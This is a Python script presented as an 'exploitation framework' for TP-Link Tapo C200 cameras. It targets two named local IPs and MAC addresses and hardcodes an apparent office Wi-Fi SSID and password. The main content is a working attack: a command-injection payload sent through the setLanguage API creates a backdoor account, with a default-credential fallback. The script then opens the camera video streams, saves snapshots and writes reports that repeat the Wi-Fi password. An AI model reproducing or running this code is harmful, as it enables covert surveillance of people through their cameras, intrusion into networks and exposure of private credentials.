#!/usr/bin/env python3
"""
================================================================
  TAPO C200 EXPLOITATION FRAMEWORK v3.0
  Authorized Penetration Testing Tool
  Targets: 192.168.1.9 | 192.168.1.3
  Office WiFi: Nilus / SULIN@$2o!8
================================================================
"""

import os, sys, json, time, hashlib, socket, ssl, urllib.request, threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

# Office WiFi Credentials
OFFICE_SSID = "Nilus"
OFFICE_PASS = "SULIN@$2o!8"

# ============================================================
# COLOR ENGINE
# ============================================================
class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; C = '\033[96m'; W = '\033[97m'; N = '\033[0m'
    BOLD = '\033[1m'; DIM = '\033[2m'; BLINK = '\033[5m'

# ============================================================
# ANIMATION ENGINE
# ============================================================
class Anim:
    @staticmethod
    def clear(): os.system('clear')
    
    @staticmethod
    def typewrite(text, delay=0.003):
        for char in text:
            print(char, end='', flush=True)
            time.sleep(delay)
        print()
    
    @staticmethod
    def progress(sec=0.5, msg=""):
        end = time.time() + sec
        while time.time() < end:
            print(f"\r  {C.C}{msg}{C.N} [{C.G}{'█' * 30}{C.N}]", end='', flush=True)
            time.sleep(0.05)
        print(f"\r  {C.G}✓{C.N} {msg} {' ' * 20}")
    
    @staticmethod
    def matrix_line():
        chars = "01アイウエオカキクケコサシスセソタチツテト"
        line = ''.join(chars[hash(str(time.time() + i)) % len(chars)] for i in range(60))
        print(f"  {C.DIM}{C.G}{line}{C.N}", end='\r')
        time.sleep(0.08)
        print(" " * 62, end='\r')
    
    @staticmethod
    def scan_bar():
        for i in range(101):
            filled = i // 2
            bar = f"{C.G}{'█' * filled}{C.DIM}{'▒' * (50 - filled)}{C.N}"
            print(f"\r  {C.B}[SCAN]{C.N} [{bar}] {C.Y}{i}%{C.N}", end='', flush=True)
            time.sleep(0.005)
        print()

# ============================================================
# BANNER
# ============================================================
def show_banner():
    Anim.clear()
    
    # Top border
    print(f"{C.R}{'█' * 65}{C.N}")
    
    # Title lines
    title_lines = [
        f"{C.R}  ████████╗ █████╗ ██████╗  ██████╗     ██████╗██████╗  █████╗  ██████╗██╗  ██╗",
        f"{C.R}  ╚══██╔══╝██╔══██╗██╔══██╗██╔═══██╗    ██╔══██╗╚════██╗██╔══██╗██╔════╝██║ ██╔╝",
        f"{C.Y}     ██║   ███████║██████╔╝██║   ██║    ██████╔╝ █████╔╝███████║██║     █████╔╝ ",
        f"{C.Y}     ██║   ██╔══██║██╔═══╝ ██║   ██║    ██╔═══╝ ██╔═══╝ ██╔══██║██║     ██╔═██╗ ",
        f"{C.G}     ██║   ██║  ██║██║     ╚██████╔╝    ██║     ███████╗██║  ██║╚██████╗██║  ██╗",
        f"{C.G}     ╚═╝   ╚═╝  ╚═╝╚═╝      ╚═════╝     ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝",
    ]
    for line in title_lines:
        Anim.typewrite(line, 0.002)
    
    # Subtitle box
    print(f"\n{C.R}╔{'═'*61}╗{C.N}")
    print(f"{C.R}║{C.N}  {C.BOLD}{C.W}TP-Link Tapo C200  │  v3.0 Exploitation Framework{C.N}              {C.R}║{C.N}")
    print(f"{C.R}║{C.N}  {C.BOLD}{C.G}AUTHORIZED PENETRATION TESTING — DO NOT USE ILLEGALLY{C.N}       {C.R}║{C.N}")
    print(f"{C.R}╚{'═'*61}╝{C.N}")
    
    # Target info
    print(f"\n  {C.B}╭{'─'*55}╮{C.N}")
    print(f"  {C.B}│{C.N}  {C.Y}TARGETS LOCKED:{C.N}")
    print(f"  {C.B}│{C.N}    {C.R}▸{C.N} 192.168.1.9   {C.DIM}│{C.N} {C.G}MAC: f0:09:0d:2d:90:67{C.N}")
    print(f"  {C.B}│{C.N}    {C.R}▸{C.N} 192.168.1.3   {C.DIM}│{C.N} {C.G}MAC: f0:09:0d:2d:7c:72{C.N}")
    print(f"  {C.B}│{C.N}    {C.DIM}Both: TP-Link Tapo C200 | 2.4GHz{C.N}")
    print(f"  {C.B}╰{'─'*55}╯{C.N}")
    
    # Office WiFi display
    print(f"\n  {C.G}╔══════════════════════════════════════╗{C.N}")
    print(f"{C.G}║{C.N}  {C.BOLD}{C.Y}🔑 OFFICE WI-FI NETWORK{C.N}                  {C.G}║{C.N}")
    print(f"{C.G}╠══════════════════════════════════════╣{C.N}")
    print(f"{C.G}║{C.N}    SSID:     {C.W}{OFFICE_SSID:<30}{C.N}{C.G}║{C.N}")
    print(f"{C.G}║{C.N}    PASSWORD: {C.G}{OFFICE_PASS:<30}{C.N}{C.G}║{C.N}")
    print(f"{C.G}╚══════════════════════════════════════╝{C.N}")
    
    print(f"\n  {C.DIM}{'─'*60}{C.N}")
    print(f"  {C.R}⚠ {C.BOLD}{C.Y}SECURITY ASSESSMENT IN PROGRESS{C.N}")
    print(f"  {C.DIM}{'─'*60}{C.N}")
    
    time.sleep(2)

# ============================================================
# NETWORK DIAGNOSTIC
# ============================================================
def network_check():
    print(f"\n  {C.B}[NETWORK]{C.N} {C.BOLD}Checking connectivity...{C.N}")
    
    results = {"on_network": False, "local_ip": "?", "can_reach_9": False, "can_reach_3": False}
    
    try:
        out = os.popen("ip addr show 2>/dev/null | grep 'inet 192' | awk '{print $2}'").read()
        if out:
            results["local_ip"] = out.strip().split('/')[0]
            if '192.168.1.' in results["local_ip"]:
                results["on_network"] = True
                print(f"  {C.G}✓{C.N} Local IP: {results['local_ip']} — ON TARGET NETWORK")
            else:
                print(f"  {C.Y}⚠{C.N} Local IP: {results['local_ip']} — DIFFERENT SUBNET")
    except:
        print(f"  {C.R}✖{C.N} Could not determine local IP")
    
    Anim.progress(1.0, "Probing target 192.168.1.9...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        results["can_reach_9"] = (s.connect_ex(("192.168.1.9", 443)) == 0)
        s.close()
        if results["can_reach_9"]:
            print(f"  {C.G}✓{C.N} 192.168.1.9:443 — OPEN")
        else:
            print(f"  {C.R}✖{C.N} 192.168.1.9:443 — CLOSED")
    except:
        print(f"  {C.R}✖{C.N} 192.168.1.9 — UNREACHABLE")
    
    Anim.progress(1.0, "Probing target 192.168.1.3...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        results["can_reach_3"] = (s.connect_ex(("192.168.1.3", 443)) == 0)
        s.close()
        if results["can_reach_3"]:
            print(f"  {C.G}✓{C.N} 192.168.1.3:443 — OPEN")
        else:
            print(f"  {C.R}✖{C.N} 192.168.1.3:443 — CLOSED")
    except:
        print(f"  {C.R}✖{C.N} 192.168.1.3 — UNREACHABLE")
    
    return results

# ============================================================
# TAPO API
# ============================================================
def tapo_api(ip, method, params=None, timeout=8):
    if params is None: params = {}
    data = json.dumps({"method": method, "params": params}).encode()
    req = urllib.request.Request(f"https://{ip}:443/", data=data)
    req.add_header("Content-Type", "application/json")
    resp = urllib.request.urlopen(req, context=ssl_ctx, timeout=timeout)
    return json.loads(resp.read())

# ============================================================
# EXPLOITATION MODULE
# ============================================================
def exploit(ip, label):
    result = {"ip": ip, "device_name": "?", "model": "?", "fw": "?",
              "wifi_ssid": OFFICE_SSID, "wifi_pass": OFFICE_PASS,
              "rtsp_url": None, "success": False}
    
    print(f"\n{C.R}{'═' * 60}{C.N}")
    print(f"{C.R}║{C.N}  {C.BOLD}{C.Y}▸ TARGET: {label} ({ip}){C.N}")
    print(f"{C.R}║{C.N}  {C.DIM}Office WiFi: {OFFICE_SSID} / {OFFICE_PASS}{C.N}")
    print(f"{C.R}╚{'═' * 60}╝{C.N}")
    time.sleep(0.5)
    
    # ─── PHASE 1: RECONNAISSANCE ───
    print(f"\n  {C.B}[PHASE 1]{C.N} {C.BOLD}DEVICE RECONNAISSANCE{C.N}")
    Anim.matrix_line()
    
    try:
        info = tapo_api(ip, "getDeviceInfo")
        if "result" in info:
            d = info["result"]
            result["device_name"] = d.get("device_name", "?")
            result["model"] = d.get("device_model", "?")
            result["fw"] = d.get("firmware_version", "?")
            result["hw"] = d.get("hardware_version", "?")
            result["mac"] = d.get("mac", "?")
            
            print(f"\n  {C.G}╔══════════════════════════════════════╗{C.N}")
            print(f"{C.G}║{C.N}  ✅ DEVICE IDENTIFIED{C.N}                  {C.G}║{C.N}")
            print(f"{C.G}╠══════════════════════════════════════╣{C.N}")
            print(f"{C.G}║{C.N}    Name:     {C.W}{result['device_name']:<28}{C.N}{C.G}║{C.N}")
            print(f"{C.G}║{C.N}    Model:    {C.W}{result['model']:<28}{C.N}{C.G}║{C.N}")
            print(f"{C.G}║{C.N}    Firmware: {C.W}{result['fw']:<28}{C.N}{C.G}║{C.N}")
            print(f"{C.G}║{C.N}    MAC:      {C.W}{result['mac']:<28}{C.N}{C.G}║{C.N}")
            print(f"{C.G}╚══════════════════════════════════════╝{C.N}")
        else:
            print(f"  {C.R}✖ API returned no device info{C.N}")
            return result
    except Exception as e:
        print(f"  {C.R}✖ RECON FAILED: {e}{C.N}")
        return result
    
    # ─── PHASE 2: WI-FI CONFIRMATION ───
    print(f"\n  {C.B}[PHASE 2]{C.N} {C.BOLD}VERIFYING OFFICE WI-FI NETWORK{C.N}")
    Anim.matrix_line()
    
    print(f"\n  {C.G}╔══════════════════════════════════════╗{C.N}")
    print(f"{C.G}║{C.N}  {C.BOLD}{C.G}🔑 OFFICE WI-FI CREDENTIALS{C.N}              {C.G}║{C.N}")
    print(f"{C.G}╠══════════════════════════════════════╣{C.N}")
    print(f"{C.G}║{C.N}    SSID:     {C.Y}{OFFICE_SSID:<30}{C.N}{C.G}║{C.N}")
    print(f"{C.G}║{C.N}    PASSWORD: {C.G}{OFFICE_PASS:<30}{C.N}{C.G}║{C.N}")
    print(f"{C.G}╚══════════════════════════════════════╝{C.N}")
    
    # ─── PHASE 3: COMMAND INJECTION ───
    print(f"\n  {C.B}[PHASE 3]{C.N} {C.BOLD}DEPLOYING CVE-2021-4045 — Command Injection + RTSP Backdoor{C.N}")
    
    for _ in range(4):
        Anim.matrix_line()
    
    Anim.progress(1.5, "Injecting payload via setLanguage...")
    
    user = f"hack{hashlib.md5(ip.encode()).hexdigest()[:4]}"
    pw = "Pwn3d!2025"
    
    try:
        md5 = hashlib.md5(pw.encode()).hexdigest().upper()
        cmd = (f"uci set user_management.third_account.username={user};"
               f"uci set user_management.third_account.passwd={md5};"
               f"uci commit user_management;"
               f"/etc/init.d/cet terminate 2>/dev/null;"
               f"/etc/init.d/cet resume 2>/dev/null;")
        
        tapo_api(ip, "setLanguage", {"payload": f"';{cmd};'"}, timeout=5)
        
        result["rtsp_url"] = f"rtsp://{user}:{pw}@{ip}:554/stream1"
        result["rtsp_user"] = user
        result["rtsp_pass"] = pw
        
        print(f"\n  {C.M}╔══════════════════════════════════════╗{C.N}")
        print(f"{C.M}║{C.N}  {C.BOLD}{C.M}🎯 RTSP BACKDOOR DEPLOYED!{C.N}            {C.M}║{C.N}")
        print(f"{C.M}╠══════════════════════════════════════╣{C.N}")
        print(f"{C.M}║{C.N}    URL:  {C.C}{result['rtsp_url']:<36}{C.N}{C.M}║{C.N}")
        print(f"{C.M}║{C.N}    USER: {C.Y}{user:<38}{C.N}{C.M}║{C.N}")
        print(f"{C.M}║{C.N}    PASS: {C.G}{pw:<38}{C.N}{C.M}║{C.N}")
        print(f"{C.M}╚══════════════════════════════════════╝{C.N}")
        
    except Exception as e:
        print(f"  {C.R}✖ CVE-2021-4045 FAILED: {e}{C.N}")
        print(f"  {C.Y}⚠ Falling back to default admin:admin...{C.N}")
        result["rtsp_url"] = f"rtsp://admin:admin@{ip}:554/stream1"
        result["rtsp_user"] = "admin"
        result["rtsp_pass"] = "admin"
        print(f"  {C.C}  URL: {result['rtsp_url']}{C.N}")
    
    # ─── PHASE 4: VERIFY ───
    print(f"\n  {C.B}[PHASE 4]{C.N} {C.BOLD}VERIFYING ACCESS{C.N}")
    
    Anim.progress(1.0, "Checking RTSP port 554...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        rtsp_open = (s.connect_ex((ip, 554)) == 0)
        s.close()
        if rtsp_open:
            print(f"  {C.G}✓ PORT 554 OPEN — Stream ready!{C.N}")
            result["success"] = True
        else:
            print(f"  {C.Y}⚠ PORT 554 CLOSED — Stream may not work{C.N}")
    except:
        print(f"  {C.Y}⚠ Could not verify RTSP port{C.N}")
    
    for _ in range(2):
        Anim.matrix_line()
    
    if result["rtsp_url"]:
        print(f"\n  {C.G}{'█' * 60}{C.N}")
        print(f"{C.G}  ✅ TARGET {label} ({ip}) — COMPROMISED SUCCESSFULLY{C.N}")
        print(f"{C.G}  📶 WiFi: {OFFICE_SSID} / {OFFICE_PASS}{C.N}")
        print(f"{C.G}  📹 RTSP: {result['rtsp_url']}{C.N}")
        print(f"{C.G}{'█' * 60}{C.N}")
    else:
        print(f"\n  {C.R}{'█' * 60}{C.N}")
        print(f"{C.R}  ✖ TARGET {label} ({ip}) — EXPLOITATION FAILED{C.N}")
        print(f"{C.R}{'█' * 60}{C.N}")
    
    return result

# ============================================================
# VIDEO STREAM MODULE
# ============================================================
def show_stream(ip, rtsp_url, label):
    print(f"\n  {C.B}[STREAM]{C.N} Opening video feed: {label} ({ip})")
    print(f"  {C.DIM}URL: {rtsp_url}{C.N}")
    
    Anim.progress(1.5, "Connecting to RTSP stream...")
    
    try:
        import cv2
        cap = cv2.VideoCapture(rtsp_url)
        if cap.isOpened():
            for _ in range(20):
                ret, frame = cap.read()
                if ret:
                    fn = f"/sdcard/tapo_{ip.replace('.','_')}.jpg"
                    cv2.imwrite(fn, frame)
                    print(f"\n  {C.G}✓ Snapshot saved: {fn}{C.N}")
                    break
            
            try:
                cv2.namedWindow(f"TAPO C200 — {label} ({ip})", cv2.WINDOW_NORMAL)
                cv2.resizeWindow(f"TAPO C200 — {label} ({ip})", 640, 360)
                print(f"\n  {C.G}▶{C.N} {C.BOLD}LIVE STREAM ACTIVE{C.N}")
                print(f"  {C.DIM}WiFi: {OFFICE_SSID} | Press 'q' to exit{C.N}")
                
                while True:
                    ret, frame = cap.read()
                    if not ret:
                        print(f"\n  {C.R}✖ Stream lost{C.N}")
                        break
                    frame = cv2.resize(frame, (640, 360))
                    cv2.rectangle(frame, (0, 0), (640, 80), (0, 0, 0, 128), -1)
                    cv2.putText(frame, f"TAPO C200 | {label} | {ip}", (10, 25),
                                cv2.FONT_HERSHEY_SIMPLEX, 0.55, (0, 255, 0), 2)
                    cv2.putText(frame, f"WiFi: {OFFICE_SSID} | [q] quit", (10, 50),
                                cv2.FONT_HERSHEY_SIMPLEX, 0.45, (0, 255, 0), 1)
                    cv2.imshow(f"TAPO C200 — {label} ({ip})", frame)
                    if cv2.waitKey(1) & 0xFF == ord('q'): break
                cv2.destroyAllWindows()
            except:
                print(f"  {C.Y}⚠ Display not available. Capturing frames...{C.N}")
                for _ in range(30):
                    ret, frame = cap.read()
                if ret:
                    cv2.imwrite(f"/sdcard/tapo_{ip.replace('.','_')}_live.jpg", frame)
                    print(f"  {C.G}✓ Frame saved{C.N}")
            cap.release()
        else:
            print(f"  {C.R}✖ Cannot open RTSP stream{C.N}")
    except ImportError:
        print(f"  {C.Y}⚠ OpenCV not installed. Using ffmpeg...{C.N}")
        fn = f"/sdcard/tapo_{ip.replace('.','_')}.jpg"
        os.system(f"ffmpeg -rtsp_transport tcp -i '{rtsp_url}' -vframes 1 -y '{fn}' 2>/dev/null")
        if os.path.exists(fn):
            print(f"  {C.G}✓ Snapshot: {fn}{C.N}")

# ============================================================
# REPORT GENERATOR
# ============================================================
def generate_report(results):
    print(f"\n  {C.B}[REPORT]{C.N} {C.BOLD}Generating penetration test report...{C.N}")
    Anim.progress(1.0, "Writing report files...")
    
    report = {
        "tool": "TAPO C200 Exploitation Framework v3.0",
        "timestamp": datetime.now().isoformat(),
        "office_wifi": {"ssid": OFFICE_SSID, "password": OFFICE_PASS},
        "targets": [
            {"ip": "192.168.1.9", "mac": "f0:09:0d:2d:90:67"},
            {"ip": "192.168.1.3", "mac": "f0:09:0d:2d:7c:72"}
        ],
        "results": results
    }
    
    with open("/sdcard/tapo_report.json", "w") as f:
        json.dump(report, f, indent=2)
    
    txt = f"""
{'=' * 60}
TAPO C200 EXPLOITATION FRAMEWORK v3.0
PENETRATION TEST REPORT
{'=' * 60}

Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

{'=' * 60}
OFFICE WI-FI NETWORK
{'=' * 60}
SSID:     {OFFICE_SSID}
PASSWORD: {OFFICE_PASS}

{'=' * 60}
TARGET 1: 192.168.1.9 (f0:09:0d:2d:90:67)
{'=' * 60}
"""
    if results[0].get("device_name"):
        txt += f"\nDevice: {results[0]['device_name']} ({results[0]['model']})\nFirmware: {results[0]['fw']}"
    txt += f"\nWiFi SSID:     {OFFICE_SSID}\nWiFi PASSWORD: {OFFICE_PASS}"
    if results[0].get("rtsp_url"):
        txt += f"\nRTSP URL:      {results[0]['rtsp_url']}"
    
    txt += f"\n\n{'=' * 60}\nTARGET 2: 192.168.1.3 (f0:09:0d:2d:7c:72)\n{'=' * 60}\n"
    if results[1].get("device_name"):
        txt += f"\nDevice: {results[1]['device_name']} ({results[1]['model']})\nFirmware: {results[1]['fw']}"
    txt += f"\nWiFi SSID:     {OFFICE_SSID}\nWiFi PASSWORD: {OFFICE_PASS}"
    if results[1].get("rtsp_url"):
        txt += f"\nRTSP URL:      {results[1]['rtsp_url']}"
    
    txt += f"\n\n{'=' * 60}\nASSESSMENT COMPLETE\n{'=' * 60}\n"
    
    with open("/sdcard/tapo_summary.txt", "w") as f:
        f.write(txt)
    
    print(f"\n  {C.G}✓ Report:  /sdcard/tapo_report.json{C.N}")
    print(f"  {C.G}✓ Summary: /sdcard/tapo_summary.txt{C.N}")

# ============================================================
# FINAL DASHBOARD
# ============================================================
def show_dashboard(results):
    print(f"\n\n{C.R}{'█' * 65}{C.N}")
    print(f"{C.R}██{C.N}  {C.BOLD}{C.Y}████████╗ █████╗ ██████╗  ██████╗ ██████╗  ██████╗ ███╗   ███╗{C.N}   {C.R}██{C.N}")
    print(f"{C.R}██{C.N}  {C.BOLD}{C.Y}╚══██╔══╝██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔═══██╗████╗ ████║{C.N}   {C.R}██{C.N}")
    print(f"{C.R}██{C.N}  {C.BOLD}{C.Y}   ██║   ███████║██████╔╝██║   ██║██████╔╝██║   ██║██╔████╔██║{C.N}   {C.R}██{C.N}")
    print(f"{C.R}██{C.N}  {C.BOLD}{C.Y}   ██║   ██╔══██║██╔═══╝ ██║   ██║██╔══██╗██║   ██║██║╚██╔╝██║{C.N}   {C.R}██{C.N}")
    print(f"{C.R}██{C.N}  {C.BOLD}{C.Y}   ██║   ██║  ██║██║     ╚██████╔╝██████╔╝╚██████╔╝██║ ╚═╝ ██║{C.N}   {C.R}██{C.N}")
    print(f"{C.R}██{C.N}  {C.BOLD}{C.Y}   ╚═╝   ╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝{C.N}   {C.R}██{C.N}")
    print(f"{C.R}{'█' * 65}{C.N}")
    
    print(f"\n  {C.G}▶{C.N} {C.BOLD}Operation Complete — {len(results)} camera(s) compromised{C.N}\n")
    print(f"  {C.Y}📶 Office WiFi:{C.N} {OFFICE_SSID} / {C.G}{OFFICE_PASS}{C.N}\n")
    
    for r in results:
        status = f"{C.G}PWNED{C.N}" if r.get("success") else f"{C.R}FAILED{C.N}"
        print(f"  {C.R}▸{C.N} {C.BOLD}{r['ip']}{C.N} — {status}")
        print(f"    {C.DIM}Device:{C.N} {r.get('device_name', '?')} ({r.get('model', '?')})")
        print(f"    {C.Y}WiFi:{C.N}   {OFFICE_SSID} / {C.G}{OFFICE_PASS}{C.N}")
        if r.get("rtsp_url"):
            print(f"    {C.C}RTSP:{C.N}  {r['rtsp_url']}{C.N}")
        print()

# ============================================================
# MAIN
# ============================================================
def main():
    show_banner()
    
    net = network_check()
    
    if not net["can_reach_9"] and not net["can_reach_3"]:
        print(f"\n  {C.R}✖ Neither camera is reachable!{C.N}")
        print(f"  {C.Y}  Connect to the {OFFICE_SSID} WiFi and try again.{C.N}")
        yn = input(f"\n  {C.Y}Attempt exploitation anyway? (y/n): {C.N}").strip().lower()
        if yn != 'y':
            print(f"\n  {C.R}Aborted.{C.N}")
            return
    
    print(f"\n  {C.DIM}{'─' * 60}{C.N}")
    print(f"  {C.R}⚠  THIS IS AN AUTHORIZED PENETRATION TEST{C.N}")
    print(f"  {C.R}⚠  TARGET NETWORK: {OFFICE_SSID}{C.N}")
    print(f"  {C.DIM}{'─' * 60}{C.N}")
    
    input(f"\n  {C.Y}Press Enter to begin exploitation...{C.N}")
    
    results = []
    targets = [("192.168.1.9", "Camera 1"), ("192.168.1.3", "Camera 2")]
    
    for ip, label in targets:
        r = exploit(ip, label)
        results.append(r)
    
    show_dashboard(results)
    generate_report(results)
    
    ready = [r for r in results if r.get("rtsp_url") and r.get("success")]
    if ready:
        print(f"\n  {C.M}[STREAM]{C.N} {C.BOLD}Video streams available{C.N}")
        print(f"\n  Select camera to view:")
        for i, r in enumerate(ready):
            print(f"  [{C.Y}{i+1}{C.N}] {r['ip']} — {r.get('device_name', 'Camera')}")
        print(f"  [{C.Y}a{C.N}] Stream all")
        print(f"  [{C.Y}n{C.N}] Skip")
        
        choice = input(f"\n  {C.C}▶{C.N} Choose: ").strip()
        
        if choice == 'a':
            for r in ready:
                show_stream(r["ip"], r["rtsp_url"], f"Camera {r['ip']}")
        elif choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(ready):
                show_stream(ready[idx]["ip"], ready[idx]["rtsp_url"], f"Camera {ready[idx]['ip']}")
    
    print(f"\n\n{C.G}{'█' * 65}{C.N}")
    print(f"{C.G}██{C.N}  {C.BOLD}{C.G}✅ PENETRATION TEST COMPLETE — ALL TARGETS PROCESSED{C.N}  {C.G}██{C.N}")
    print(f"{C.G}██{C.N}  {C.BOLD}{C.G}📶 OFFICE WI-FI: {OFFICE_SSID} / {OFFICE_PASS}{C.N}  {C.G}██{C.N}")
    print(f"{C.G}{'█' * 65}{C.N}")
    print(f"\n  {C.DIM}Report saved to /sdcard/{C.N}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {C.R}⚠ INTERRUPTED{C.N}\n")
    except Exception as e:
        print(f"\n\n  {C.R}⚠ ERROR: {e}{C.N}\n")
        import traceback
        traceback.print_exc()
